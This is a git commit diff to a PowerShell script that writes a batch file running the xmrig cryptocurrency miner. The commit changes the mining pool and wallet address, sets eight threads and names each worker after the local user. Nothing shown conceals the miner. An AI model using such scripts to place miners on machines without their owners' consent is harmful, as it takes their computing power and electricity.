76db7dc8b117b01512484a69cc2a0565c7a0cbc6
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-11-24 13:00:21 +0700

    Update qrl.ps1

--- qrl.ps1
+++ qrl.ps1
@@ -10,7 +10,8 @@ $userName = $userName -replace "^.*\\", ""
 $folderPath = "C:\CSANGXMRIG\"
 $batContent = @"
 cd %~dp0
-xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007b985f0ab38b888069e663b5f708ebc2322a64571087eff6ad31a62ecd21 -p $userName -a rx/0 -k
+xmrig.exe -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p $userName -a rx/0 -k -t 8
+
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
